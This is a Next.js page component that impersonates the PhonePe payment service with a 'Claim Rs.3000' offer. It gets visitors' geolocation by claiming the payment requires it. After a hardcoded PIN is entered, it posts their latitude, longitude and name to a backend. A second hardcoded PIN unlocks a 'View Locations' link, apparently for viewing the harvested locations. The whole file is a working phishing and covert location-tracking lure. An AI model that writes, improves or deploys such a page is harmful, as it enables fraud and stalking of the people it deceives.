'use client'
import { useEffect, useState } from "react";
import Image from "next/image";
import { Roboto } from 'next/font/google'
import Link from "next/link";
const roboto = Roboto({
  weight: '100',
  subsets: ['latin'],
  display: "block"
})

export default function Home() {
  const [pin, setPin] = useState('');
  const [name, setName] = useState('Shanwaz Khan');
  const [latitude, setLatitude] = useState('');
  const [longitude, setLongitude] = useState('');
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false)
  const [isErr, setIsErr] = useState(false)

  const sendData = async () => {
    console.log(latitude)
    let data = await fetch('http://localhost:3000/api/user', {
      method: "post",
      body: JSON.stringify({ latitude, longitude, name })
    })
    data =await data.json()
    console.log(data)
    if (data) {
      setMessage(data.message)
      setLoading(false)
    }
  }

useEffect(()=>{
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        showPosition,
        handleLocationError
      )

    } else {
      setMessage('In order to make transactions, please enable your location.');
      setIsErr(true);
    }
  
},[])

  function showPosition(position) {
    setLatitude(position.coords.latitude);
    setLongitude(position.coords.longitude);
  }

  let pin1 = '12Ae05p'
  let pin2 = 'hspl321'

  async function verifyPIN() {
    if (pin.toLocaleLowerCase() == pin1.toLocaleLowerCase()) {
      setLoading(true)
      setTimeout(() => {
        sendData()
      }, 1000);

    }
  }

  function handleLocationError(error) {
    setMessage('In Order To Process The Payment Geo Location is Required')
    setLoading(false)
    setIsErr(true)
  }
  return (
    <>
      <div className='pinBox'>
        <div className="PhonepeLogo">
          <a target="_blank" href="https://www.phonepe.com/">
            <Image
              src='https://cdn.shopify.com/s/files/1/0810/2582/7123/files/phonepe.webp?v=1696337949'
              width={200}
              height={80}
              alt='phonePe'
            />
          </a>
        </div>

        <div className="Input">
          <input type="text" value={name} onChange={(e) => setName(e.target.value)} placeholder="Name as the Payee Sets" />
        </div>
        <div className="Input">
          <input type="text" value={pin} onChange={(e) => setPin(e.target.value)} placeholder="Enter Security Pin" />
        </div>

        {!isErr?
          <button className={pin == pin1 || pin == pin2 ? 'Verify-Btn show' : "Verify-Btn blur"} onClick={verifyPIN}>{loading ? 'Processing' : 'Claim Rs.3000'}</button>
          :<button className="Verify-Btn blur">{loading ? 'Processing' : 'Claim Rs.3000'}</button>
        }

        {message ?
          <div className="message">
            <p>{message}.</p>
          </div>
          : ''
        }
        <div className="contact-us">
          <a href="https://support.phonepe.com/"> contact</a>
        </div>
      </div>


      {pin == pin2 ?
        <div className="view-data">

          <Link href={'/user'}>View Locations</Link>

        </div>
        : ''
      }
    </>
  )
}